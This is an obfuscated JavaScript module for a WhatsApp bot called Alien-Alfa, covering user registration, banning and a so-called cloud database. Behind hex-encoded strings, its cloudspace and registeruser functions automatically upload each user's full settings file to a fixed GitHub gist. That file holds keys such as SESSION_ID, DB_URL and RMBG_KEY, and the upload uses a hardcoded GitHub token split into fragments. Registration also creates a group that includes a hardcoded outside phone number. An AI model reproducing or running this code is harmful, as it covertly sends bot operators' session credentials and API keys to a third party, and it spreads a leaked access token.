const _0x5ca9ce = _0x26eb;
(function(_0x4e15ef, _0x57158b) {
  const _0x4028cb = _0x26eb,
    _0x423e89 = _0x4e15ef();
  while (!![]) {
    try {
      const _0x467b14 = parseInt(_0x4028cb(0x21f)) / 0x1 + parseInt(_0x4028cb(0x230)) / 0x2 * (parseInt(_0x4028cb(0x229)) / 0x3) + -parseInt(_0x4028cb(0x1fc)) / 0x4 * (parseInt(_0x4028cb(0x227)) / 0x5) + parseInt(_0x4028cb(0x23f)) / 0x6 + parseInt(_0x4028cb(0x1f0)) / 0x7 + parseInt(_0x4028cb(0x21d)) / 0x8 + parseInt(_0x4028cb(0x1e3)) / 0x9 * (-parseInt(_0x4028cb(0x224)) / 0xa);
      if (_0x467b14 === _0x57158b) break;
      else _0x423e89['push'](_0x423e89['shift']());
    } catch (_0x54ba22) {
      _0x423e89['push'](_0x423e89['shift']());
    }
  }
}(_0x57d6, 0xbcdea));
const fs = require('fs'),
  {
    writeFile,
    unlink,
    readFile
  } = require(_0x5ca9ce(0x1e6)),
  chalk = require(_0x5ca9ce(0x210)),
  {
    exec,
    spawn,
    execSync
  } = require('child_process'),
  axios = require(_0x5ca9ce(0x22f));
let path = './database/settings.json';
const {
  WORK_TYPE
} = require(_0x5ca9ce(0x1e2)), events = require(_0x5ca9ce(0x22a)), maker = require(_0x5ca9ce(0x1ec)), fetch = require('node-fetch'), {
  Octokit
} = require('@octokit/rest'), octokit = new Octokit({
  'auth': 'ghp_J175T' + 'PIO5ho5ggz' + _0x5ca9ce(0x23b) + _0x5ca9ce(0x1f3)
});
async function sudoBan(_0x2aa082, _0x2967e4) {
  const _0xa069dc = _0x5ca9ce;
  let _0x537c2e = await _0x2967e4[_0xa069dc(0x1fb)](_0x2aa082['id']);
  for (let _0x4f1411 of _0x2aa082[_0xa069dc(0x22d)]) {
    switch (_0x2aa082['action']) {
      case 'add': {
        let _0x6538e8 = JSON[_0xa069dc(0x213)](fs[_0xa069dc(0x21a)]('./database/settings.json')),
          _0x350b43 = _0x6538e8[_0xa069dc(0x23a)][_0xa069dc(0x1e4)],
          _0x5122f4 = _0x2aa082['id'] + ':' + _0x4f1411,
          _0x3208a7 = _0x350b43[_0xa069dc(0x208)](_0x5122f4);
        if (_0x3208a7) return _0x2967e4[_0xa069dc(0x1fd)](_0x2aa082['id'], [_0x4f1411], _0xa069dc(0x1ff)), await _0x2967e4['sendMessage'](_0x2aa082['id'], {
          'text': '_@' + _0x4f1411['split']('@')[0x0] + _0xa069dc(0x1fa)
        });
      }
      break;
    }
  }
};

function _0x26eb(_0xefb388, _0x266e38) {
  const _0x57d621 = _0x57d6();
  return _0x26eb = function(_0x26eb04, _0x2de05e) {
    _0x26eb04 = _0x26eb04 - 0x1e2;
    let _0x417a16 = _0x57d621[_0x26eb04];
    return _0x417a16;
  }, _0x26eb(_0xefb388, _0x266e38);
}
async function regnewuser(_0x406691) {
  const _0x407cfa = _0x5ca9ce;
  let _0x455e9c = JSON[_0x407cfa(0x213)](fs['readFileSync'](_0x407cfa(0x239)));
  console[_0x407cfa(0x223)](_0x407cfa(0x218));
  let _0x1aa868 = _0x455e9c[_0x407cfa(0x1ed)][_0x407cfa(0x201)]()[_0x407cfa(0x208)]('@s.whatsapp.net');
  if (_0x1aa868) {
    let _0x3e4485 = _0x407cfa(0x20d) + require(_0x407cfa(0x23e))['version'] + '\x0aTotal\x20Plugins\x20:\x20' + events[_0x407cfa(0x219)][_0x407cfa(0x21e)] + '\x0aWorktype:\x20' + WORK_TYPE + '```';
    return _0x406691[_0x407cfa(0x232)](_0x406691[_0x407cfa(0x214)]['id'], {
      'text': _0x3e4485
    });
  }
  if (!_0x1aa868) {
    const _0x1cb047 = [{
        'index': 0x1,
        'urlButton': {
          'displayText': '𝘽𝙤𝙩\x20𝙍𝙚𝙥𝙤\x20𝙡𝙞𝙣𝙠𝙨',
          'url': _0x407cfa(0x209)
        }
      }, {
        'index': 0x3,
        'quickReplyButton': {
          'displayText': _0x407cfa(0x1f4),
          'id': 'setup'
        }
      }],
      _0x543c6e = {
        'text': _0x407cfa(0x21c),
        'footer': _0x407cfa(0x22c),
        'templateButtons': _0x1cb047
      };
    await _0x406691['sendMessage'](_0x406691[_0x407cfa(0x214)]['id'], _0x543c6e);
  };
};

function _0x57d6() {
  const _0x3654a6 = ['updateProfilePicture', 'LANG', 'BRANCH', 'groupCreate', 'includes', 'https://www.youtube.com/alienalfa', 'THEME', 'BOT_NAME', 'FOOTER', '```X-Alfa\x20connected\x20\x0aversion\x20:\x20', 'WELCOME_MSG', 'WORK_TYPE', 'chalk', 'config', 'RMBG_KEY', 'parse', 'user', '359889999996@s.whatsapp.net', 'PACKNAME', 'reply', '🟢\x20Connection\x20Up\x20regnewuser!', 'commands', 'readFileSync', 'MODE', '```Hey\x20Buddy,\x0awelcome\x20to\x20Alien-Alfa\x20Family\x0a\x0a\x20You\x20are\x20a\x20first\x20time\x20user,\x0aUse\x20Join\x20Button\x20to\x20get\x20a\x20permenent\x20Database\x20for\x20This\x20Number.\x0a\x0aNOTE:\x20This\x20database\x20will\x20be\x20used\x20for\x20every\x20AlienAlfa\x20Bots\x20You\x20use\x20in\x20future```', '6939944mnrASg', 'length', '393231rbgKJO', 'd83fa03a09d9a09032f3180a8d1ecd02', '_You\x20Are\x20Already\x20a\x20Family\x20Member_', 'FONT_STYLE', 'log', '3470woMPYB', 'ANTILINK_ACTION', 'phone_num', '15XfvHJL', 'client', '55098PlLOsm', '../lib/event', '.json', '[ᴀʟɪᴇɴ\x20ᴀʟꜰᴀ-ᴍᴅ]', 'participants', 'pushName', 'axios', '18QHdLHh', 'Failed\x20to\x20write\x20updated\x20data\x20to\x20file', 'sendMessage', 'AUTHOR', 'STORAGE_JID', 'MESSAGE_MEM', 'Storage', 'kick', 'ALIVE', './database/settings.json', 'settings', 'LNySElNgZs', 'GOODBYE_MSG', 'ANTILINK', '../package.json', '3731118CCAmyO', 'SESSION_ID', 'update', 'HANDLER', 'send', '../database/settings', '33183iLUXaW', 'banned', 'OWNER_NAME', 'fs/promises', 'DB_URL', 'This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!', 'utf-8', 'stringify', 'split', 'mumaker', 'UserId', 'jid', 'LOGS', '840007oDZoUO', 'LANGUAGE', 'SUDO', 'hK25J0nm992', 'Join!', 'INTERNAL_MENU', './media/AAA.jpg', '../session.json', 'then', 'Cloud\x20DB\x20Update', '\x20Is\x20*Permanantly\x20Banned*\x20fron\x20This\x20Group_', 'groupMetadata', '153164bmmWrm', 'groupParticipantsUpdate', 'creds', 'remove', 'rest', 'toString', 'gists', 'name'];
  _0x57d6 = function() {
    return _0x3654a6;
  };
  return _0x57d6();
}
async function cloudspace() {
  const _0x3df6f1 = _0x5ca9ce;
  let _0x18319d = JSON[_0x3df6f1(0x213)](fs['readFileSync']('./database/settings.json')),
    _0x53390a = _0x18319d[_0x3df6f1(0x211)][_0x3df6f1(0x1e7)][_0x3df6f1(0x201)]()[_0x3df6f1(0x208)]('c');
  if (_0x53390a) {
    let _0xc864a6 = require(_0x3df6f1(0x1f7)),
      _0x2a0795 = await _0xc864a6[_0x3df6f1(0x1fe)]['me']['id'][_0x3df6f1(0x1eb)](':')[0x0],
      _0x31feb1 = await _0xc864a6[_0x3df6f1(0x1fe)]['me']['id']['split']('@')[0x1],
      _0x39ec5e = _0x2a0795 + '@' + _0x31feb1,
      _0x2a6047 = _0x39ec5e + _0x3df6f1(0x22b);
    var _0x2ff307 = JSON[_0x3df6f1(0x1ea)](_0x18319d, null, 0x2);
    await octokit[_0x3df6f1(0x200)]['gists'][_0x3df6f1(0x241)]({
      'gist_id': _0x3df6f1(0x220),
      'description': _0x3df6f1(0x1f9),
      'files': {
        [_0x2a6047]: {
          'content': _0x18319d
        }
      }
    });
  }
}
async function registeruser(_0x4418ee) {
  setTimeout(() => {
    const _0x2ba4cb = _0x26eb;
    let _0x4f3392 = JSON[_0x2ba4cb(0x213)](fs[_0x2ba4cb(0x21a)]('./database/settings.json')),
      _0x486a02 = _0x4f3392['config']['STORAGE_JID'],
      _0x4039fb = _0x486a02[_0x2ba4cb(0x201)]()[_0x2ba4cb(0x208)]('@g.us');
    if (!_0x4039fb) readFile(path, async (_0x2d57cc, _0x2bae5a) => {
      const _0x2325c0 = _0x2ba4cb;
      if (_0x2d57cc) {
        console[_0x2325c0(0x223)](_0x2d57cc);
        return;
      }
      const _0x886194 = JSON[_0x2325c0(0x213)](_0x2bae5a);
      let _0x26fc15 = await _0x4418ee[_0x2325c0(0x228)][_0x2325c0(0x207)](_0x2325c0(0x236), [_0x2325c0(0x215)]);
      await _0x4418ee[_0x2325c0(0x228)]['sendMessage'](_0x26fc15['id'], {
        'text': _0x2325c0(0x1e8)
      }), _0x4418ee[_0x2325c0(0x237)](_0x2325c0(0x215));
      let _0x460e0d = await _0x26fc15['id'];
      _0x886194['config'][_0x2325c0(0x234)] = _0x460e0d, writeFile(path, JSON['stringify'](_0x886194, null, 0x2), async _0x4819fc => {
        const _0x3b0a02 = _0x2325c0;
        if (_0x4819fc) {
          _0x4418ee[_0x3b0a02(0x217)](_0x3b0a02(0x231));
          return;
        }
        await _0x4418ee[_0x3b0a02(0x228)][_0x3b0a02(0x204)](_0x26fc15['id'], fs[_0x3b0a02(0x21a)](_0x3b0a02(0x1f6)));
      });
    });
    else return;
    setTimeout(async () => {
      const _0x10d1e9 = _0x2ba4cb;
      let _0x351bb0 = require(_0x10d1e9(0x1f7)),
        _0x43b47a = await _0x351bb0[_0x10d1e9(0x1fe)]['me']['id']['split'](':')[0x0],
        _0x54cb8b = await _0x351bb0[_0x10d1e9(0x1fe)]['me']['id'][_0x10d1e9(0x1eb)]('@')[0x1],
        _0x29e86b = _0x43b47a + '@' + _0x54cb8b,
        _0x2d4e81 = _0x29e86b + _0x10d1e9(0x22b);
      const _0x62bc85 = fs[_0x10d1e9(0x21a)](_0x10d1e9(0x239), _0x10d1e9(0x1e9));
      await octokit[_0x10d1e9(0x200)][_0x10d1e9(0x202)][_0x10d1e9(0x241)]({
        'gist_id': 'd83fa03a09d9a09032f3180a8d1ecd02',
        'description': _0x10d1e9(0x1f9),
        'files': {
          [_0x2d4e81]: {
            'content': _0x62bc85
          }
        }
      })[_0x10d1e9(0x1f8)](await console['log']('Done\x20Creating\x20New\x20Db')), setTimeout(() => {
        const _0x81a09f = _0x10d1e9;
        return process[_0x81a09f(0x243)]('reset');
      }, 0x1f40);
    }, 0x1388);
  }, 0x7d0), readFile(path, async (_0x21c4de, _0x10ac07) => {
    const _0x1f1e4c = _0x26eb;
    if (_0x21c4de) {
      console[_0x1f1e4c(0x223)](_0x21c4de);
      return;
    }
    const _0x286829 = JSON['parse'](_0x10ac07);
    let _0x43ad11 = _0x286829['UserId'][_0x1f1e4c(0x201)]()[_0x1f1e4c(0x208)]('@s.whatsapp.net');
    if (_0x43ad11) return _0x4418ee[_0x1f1e4c(0x217)](_0x1f1e4c(0x221));
    let _0xaf9a9a = _0x4418ee[_0x1f1e4c(0x22e)],
      _0x3679c5 = _0x4418ee[_0x1f1e4c(0x214)],
      _0x468c7a = _0x4418ee[_0x1f1e4c(0x1ee)][_0x1f1e4c(0x201)]()[_0x1f1e4c(0x1eb)]('@')[0x0];
    _0x286829[_0x1f1e4c(0x203)] = _0xaf9a9a, _0x286829[_0x1f1e4c(0x1ed)] = _0x3679c5, _0x286829[_0x1f1e4c(0x226)] = _0x468c7a, _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x242)] = relconfig[_0x1f1e4c(0x242)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x20f)] = relconfig[_0x1f1e4c(0x20f)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x20b)] = relconfig['BOT_NAME'], _0x286829['config'][_0x1f1e4c(0x1e5)] = relconfig[_0x1f1e4c(0x1e5)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x1f2)] = relconfig['SUDO'], _0x286829['config'][_0x1f1e4c(0x233)] = relconfig[_0x1f1e4c(0x233)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x216)] = relconfig['PACKNAME'], _0x286829['config'][_0x1f1e4c(0x212)] = relconfig[_0x1f1e4c(0x212)], _0x286829[_0x1f1e4c(0x211)]['LANG'] = relconfig[_0x1f1e4c(0x205)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x225)] = relconfig[_0x1f1e4c(0x225)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x23d)] = relconfig['ANTILINK'], _0x286829[_0x1f1e4c(0x211)]['FOOTER'] = relconfig[_0x1f1e4c(0x20c)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x20a)] = relconfig['THEME'], _0x286829['config'][_0x1f1e4c(0x222)] = relconfig[_0x1f1e4c(0x222)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x1f1)] = relconfig[_0x1f1e4c(0x1f1)], _0x286829['config'][_0x1f1e4c(0x1f5)] = relconfig[_0x1f1e4c(0x1f5)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x21b)] = relconfig[_0x1f1e4c(0x21b)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x234)], _0x286829['config'][_0x1f1e4c(0x1e7)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x240)] = relconfig[_0x1f1e4c(0x240)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x1ef)] = relconfig[_0x1f1e4c(0x1ef)], _0x286829[_0x1f1e4c(0x211)][_0x1f1e4c(0x206)] = relconfig[_0x1f1e4c(0x206)], _0x286829[_0x1f1e4c(0x211)]['B1'] = relconfig['B1'], _0x286829[_0x1f1e4c(0x211)]['B2'] = relconfig['B2'], _0x286829[_0x1f1e4c(0x211)]['B3'] = relconfig['B3'], _0x286829[_0x1f1e4c(0x211)]['B4'] = relconfig['B4'], _0x286829['config']['B5'] = relconfig['B5'], _0x286829[_0x1f1e4c(0x235)][_0x1f1e4c(0x23c)] = relconfig[_0x1f1e4c(0x23c)], _0x286829['MESSAGE_MEM'][_0x1f1e4c(0x20e)] = relconfig[_0x1f1e4c(0x20e)], _0x286829['MESSAGE_MEM'][_0x1f1e4c(0x238)] = relconfig[_0x1f1e4c(0x238)], writeFile(path, JSON[_0x1f1e4c(0x1ea)](_0x286829, null, 0x2), _0x167a24 => {
      const _0x21e0d8 = _0x1f1e4c;
      if (_0x167a24) {
        _0x4418ee[_0x21e0d8(0x217)]('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');
        return;
      }
      _0x4418ee[_0x21e0d8(0x217)]('_Registered\x20Successfully_');
    });
  });
}
//============================================================================================================================================
module.exports = {
  cloudspace,
  sudoBan,
  regnewuser,
  registeruser
};
//============================================================================================================================================